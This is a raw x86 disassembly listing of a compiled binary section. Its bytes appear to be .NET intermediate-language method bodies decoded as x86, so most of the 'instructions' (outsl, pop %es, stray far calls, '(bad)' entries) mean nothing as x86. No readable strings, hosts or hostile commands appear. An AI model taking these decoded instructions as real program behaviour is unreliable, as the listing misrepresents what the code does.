  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 46       	add    $0x46720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 4e 21       	and    $0x214e7216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 b8    	or     -0x478de7db(%edx),%ah
  4031e4:	21 00                	and    %eax,(%eax)
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 ca    	or     -0x358de5db(%edx),%ah
  4031f5:	21 00                	and    %eax,(%eax)
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 de             	or     -0x22(%edx),%dh
  403227:	21 00                	and    %eax,(%eax)
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 3c             	or     0x3c(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 3c             	or     0x3c(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 40                	jb     0x403303
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 4a             	or     %esi,0x4a(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 5e                	jb     0x403344
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 7e                	jb     0x403370
  4032f2:	22 00                	and    (%eax),%al
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 3c             	or     0x3c(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 94                	jb     0x4032a2
  40330e:	22 00                	and    (%eax),%al
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 9c                	jb     0x4032c0
  403324:	22 00                	and    (%eax),%al
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 a8                	jb     0x4032d8
  403330:	22 00                	and    (%eax),%al
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 b8                	jb     0x403425
  40346d:	22 00                	and    (%eax),%al
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 be             	adc    %esi,-0x42(%edx)
  4034ae:	22 00                	and    (%eax),%al
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 04 23    	or     0x23047209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	1e                   	push   %ds
  4034ec:	23 00                	and    (%eax),%eax
  4034ee:	70 28                	jo     0x403518
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 4a             	or     %esi,0x4a(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 56             	or     0x56(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	66 23 00             	and    (%eax),%ax
  403523:	70 6f                	jo     0x403594
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 4a                	jb     0x40357b
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 74             	or     0x74(%edx),%dh
  403540:	23 00                	and    (%eax),%eax
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 8a             	adc    %esi,-0x76(%edx)
  40362e:	23 00                	and    (%eax),%eax
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
